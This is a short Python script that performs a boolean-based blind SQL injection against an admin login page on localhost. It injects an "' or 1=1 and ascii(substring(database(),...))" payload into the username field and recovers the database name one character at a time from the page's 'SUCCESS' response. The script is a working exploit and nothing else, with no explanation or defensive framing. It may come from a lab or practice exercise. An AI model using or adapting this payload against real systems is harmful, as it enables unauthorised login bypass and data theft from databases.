import requests
URL = "http://localhost/adminlogin.php"

min = 48 # '1'
max = 122 # 'z'
DB_LEN = 13
dbname = []
for idx in range(1, DB_LEN+1):
	for cnt in range(min, max+1):
		sqlquery = "' or 1=1 and ascii(substring(database()," + str(idx) + ",1))<=" + str(cnt) + "# "
		postquery = "username=" + sqlquery + "&password=1&form=submit"
		res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})
		if "SUCCESS" in res.text:
			print(f"Catch one! {cnt}")
			dbname.append(chr(cnt))
			break
print(f"DONE! DB name is {dbname}")